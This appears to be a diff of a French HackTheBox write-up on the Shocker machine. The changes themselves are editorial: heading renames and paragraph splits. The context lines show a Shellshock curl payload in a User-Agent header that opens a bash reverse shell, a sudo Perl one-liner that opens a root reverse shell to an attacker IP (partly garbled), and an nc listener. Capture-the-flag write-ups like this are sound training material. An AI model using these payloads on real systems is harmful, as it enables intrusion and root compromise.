@@ -63,7 +63,7 @@ Aucun templating Hugo dans le corps, pour éviter les erreurs d’archetype.
 -->
 ## Introduction
 
-Dans ce writeup, **nous allons explorer** la machine **Shocker.htb**, une box emblématique d’HTB illustrant l’exploitation de la vulnérabilité **Shellshock (CVE-2014-6271)** au travers d’un script CGI exposé dans le répertoire `/cgi-bin/`. Au terme d’une énumération méthodique qui nous permet d’identifier le vecteur d’attaque, l’exploitation du script `user.sh` nous offre un premier accès au système sous l’utilisateur *shelly*. Nous poursuivons ensuite notre progression vers une **élévation de privilèges** en tirant parti d’un binaire Perl exécutable en tant que root sans mot de passe via `sudo`.
+Dans ce writeup, nous allons explorer la machine **Shocker**, une box emblématique d’HTB illustrant l’exploitation de la vulnérabilité **Shellshock (CVE-2014-6271)** au travers d’un script CGI exposé dans le répertoire `/cgi-bin/`. Au terme d’une énumération méthodique qui nous permet d’identifier le vecteur d’attaque, l’exploitation du script `user.sh` nous offre un premier accès au système sous l’utilisateur *shelly*. Nous poursuivons ensuite notre progression vers une **élévation de privilèges** en tirant parti d’un binaire Perl exécutable en tant que root sans mot de passe via `sudo`.
  **Ce parcours met en évidence l’importance d’une énumération rigoureuse suivie d’une exploitation ciblée et maîtrisée.**
 
 ---
@@ -222,7 +222,7 @@ PORT      STATE         SERVICE
 
 
 
-### Scan répertoires
+### Scan des répertoires
 Pour la partie découverte de chemins web, j’utilise mon script dédié {{< script "mon-recoweb" >}}
 
 ```bash
@@ -314,7 +314,7 @@ Port 80 (http)
 
 La mise en évidence du répertoire `/cgi-bin/` constitue un indicateur fort : il s’agit de l’emplacement classique des scripts exécutés via le moteur CGI d’Apache, un contexte propice à l’apparition de vulnérabilités historiques comme **Shellshock**. Cette découverte mérite un examen plus approfondi du contenu du répertoire ainsi qu’un fuzzing ciblé des scripts qu’il expose.
 
-### Scan vhosts
+### Scan des vhosts
 
 Enfin, je teste rapidement la présence de vhosts  avec  {{< script "mon-subdomains" >}}
 
@@ -382,12 +382,16 @@ Port 80 (http)
 
 ## Exploitation – Prise pied (Foothold)
 
+### Analyse de l'image
+
 Le site web exposé par la machine est extrêmement minimaliste : il ne présente qu’une unique page contenant simplement une image, *bug.jpg*, sans aucun lien ni fonctionnalité apparente. Face à une surface d’attaque aussi restreinte, il est logique d’envisager que cette image puisse dissimuler une information utile à la progression. Nous commençons donc par la télécharger et l’analyser à l’aide des outils et méthodes décrits dans la recette **{{< recette "Outils-Stéganographie" >}}**, afin de vérifier si elle ne renferme pas un fichier embarqué, des métadonnées révélatrices ou un indice spécifique.
  Après avoir appliqué l’ensemble de ces techniques (binwalk, strings, exiftool, steghide…), nous ne mettons en évidence aucun élément utile, ce qui confirme que **l’image ne constitue pas un vecteur d’exploitation** dans ce cas.
 
 
 
 ![Bug](bug.jpg)
+
+### Scan du /cgi-bin/
 
 Conformément à ce que suggérait l’énumération, nous concentrons maintenant notre attention sur le répertoire `/cgi-bin/`, point d’entrée potentiel pour l’exploitation.
 
@@ -514,7 +518,7 @@ curl -H 'User-Agent: () { :; }; /bin/bash -c "bash -i >& /dev/tcp/10.10.14.152/4
 
 ```
 
-### Kali Linux
+### Reverse Shell dans Kali Linux
 
 Dans un autre terminal de kali linux
 
@@ -583,7 +587,7 @@ Commençons par exécuter un [payload bash en perl](https://www.revshells.com/) 
 shelly@Shocker:/home/shelly$ sudo perl -e 'use Socket;$i="10.10.14.152";$p=12345;socket(S,PF_INET,SOCK_STREAM,getprotob;if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
 ```
 
-### Kali Linux
+### Root Shell dans Kali Linux
 
 ```bash
 nc -lvnp 12345                                                      
@@ -609,6 +613,11 @@ be89xxxxxxxxxxxxxxxxxxxxxxxxxx9bef
 
 ## Conclusion
 
-Cette machine illustre parfaitement l’importance d’une énumération structurée et d’une interprétation attentive des indices laissés en surface. À partir d’une interface web quasi inexistante, la découverte du répertoire `/cgi-bin/` a orienté notre analyse vers une piste classique mais toujours pertinente : les scripts CGI vulnérables à Shellshock. L’exploitation progressive — validation de la faille, exécution de commandes, puis obtention d’un reverse shell — nous a permis d’obtenir un accès utilisateur avant de finaliser l’attaque par une élévation de privilèges simple et directe via `sudo` et Perl.
- **Un déroulé simple et cohérent, qui montre qu’une vulnérabilité historique comme Shellshock peut rester exploitable lorsqu’elle n’est pas corrigée.**.
+Cette machine illustre parfaitement l’importance d’une énumération structurée et d’une interprétation attentive des indices laissés en surface. 
+
+À partir d’une interface web quasi inexistante, la découverte du répertoire `/cgi-bin/` a orienté notre analyse vers une piste classique mais toujours pertinente : les scripts CGI vulnérables à Shellshock. 
+
+L’exploitation progressive — validation de la faille, exécution de commandes, puis obtention d’un reverse shell — nous a permis d’obtenir un accès utilisateur avant de finaliser l’attaque par une élévation de privilèges simple et directe via `sudo` et Perl.
+
+**Un déroulé simple et cohérent, qui montre qu’une vulnérabilité historique comme Shellshock peut rester exploitable lorsqu’elle n’est pas corrigée.**.
 
